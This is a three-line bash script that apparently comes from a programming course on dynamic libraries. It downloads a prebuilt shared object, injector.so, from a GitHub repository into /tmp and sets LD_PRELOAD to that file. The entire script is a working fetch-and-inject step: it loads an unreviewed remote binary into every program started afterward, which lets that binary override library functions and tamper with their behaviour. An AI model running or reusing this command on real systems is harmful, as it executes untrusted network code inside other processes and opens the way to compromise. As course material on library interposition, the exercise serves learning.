#!/bin/bash
wget -P /tmp https://github.com/stenwire/alx-low_level_programming/raw/main/0x18-dynamic_libraries/injector.so
export LD_PRELOAD=/tmp/injector.so
